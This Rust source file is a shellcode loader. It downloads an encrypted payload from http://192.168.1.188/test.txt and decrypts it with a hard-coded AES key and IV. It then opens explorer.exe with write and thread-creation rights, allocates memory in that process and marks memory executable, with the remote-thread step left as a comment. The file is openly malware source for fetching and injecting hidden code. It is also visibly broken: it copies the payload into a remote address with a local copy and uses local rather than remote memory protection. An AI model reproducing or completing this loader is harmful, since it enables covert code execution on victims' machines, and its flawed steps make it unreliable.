use sysinfo::{ProcessExt, System, SystemExt, PidExt};
use windows::{Win32::System::{Memory::{self, VirtualAllocEx, MEM_RESERVE, PAGE_READWRITE, MEM_COMMIT, VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS}, Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE}}};
use windows::Win32::Foundation::HANDLE;
use crypto::{symmetriccipher::{Decryptor, SymmetricCipherError}, aes::{self, cbc_decryptor}, blockmodes, buffer::{self, RefReadBuffer, RefWriteBuffer, BufferResult, WriteBuffer, ReadBuffer}};
use core::ffi::c_void;
use core::ptr;

fn decrypt(sc: &[u8]) -> Result<Vec<u8>, SymmetricCipherError> {
    let key : [u8;16] = [0x2d,0x46,0xc6,0x15,0x22,0xee,0xa0,0x29,0x7,0x58,0xb7,0x58,0x53,0x78,0xa7,0xba];
    let iv : [u8;16] = [0xb4,0x92,0xa9,0xda,0xf9,0xb5,0x5c,0xff,0x4d,0x74,0x92,0x57,0xe6,0xdd,0xd5,0xb0];

    let mut decryptor : Box<dyn Decryptor> = cbc_decryptor(
        aes::KeySize::KeySize128,
        &key,
        &iv,
        blockmodes::PkcsPadding
    );
    const SIZE: usize = u8::MAX as usize;

    let mut dsc : Vec<u8> = Vec::<u8>::new();
    let mut read_buffer : RefReadBuffer = buffer::RefReadBuffer::new(&sc);
    let mut buffer : [u8; SIZE] = [0; SIZE];
    let mut write_buffer : RefWriteBuffer = buffer::RefWriteBuffer::new(&mut buffer);


    loop {
        let dec : BufferResult = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
        dsc.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
        match dec {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(dsc)
}

fn find_proc(name: &str) -> u32 {
    let mut sys: System = System::new_all();

    sys.refresh_all();

    let mut pid: u32 = 0;

    for (proc_id, process) in sys.processes() {
        if process.name() == name {
            pid = proc_id.as_u32();
            break;
        }
    }
    return pid;
}

fn get_data() -> Result<Vec<u8>, reqwest::Error> {
    let resp = reqwest::blocking::get("http://192.168.1.188/test.txt")?.bytes()?;

    return Ok(resp.to_vec());
}

fn main() {

    let proc: &str = "explorer.exe";

    let pid: u32 = find_proc(&proc);

    if pid == 0 {
       panic!("[!] Process not found!"); 
    }

    let sc: Vec<u8> = get_data().unwrap();
    let sc_len: usize = sc.len();

    let dsc: Vec<u8> = decrypt(&sc).unwrap();

    unsafe {
        let h_proc: HANDLE = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            false,
            pid).expect("Could not open process");

        let exec_mem: *mut c_void = VirtualAllocEx(
            h_proc,
            ptr::null(),
            sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        ptr::copy(dsc.as_ptr(), exec_mem as *mut _, sc_len);

        let old: *mut PAGE_PROTECTION_FLAGS = ptr::null_mut();

        VirtualProtect(exec_mem, sc_len, PAGE_EXECUTE_READ, old);

        // CreateRemoteThread
    }

    println!("Hello, world!");
}
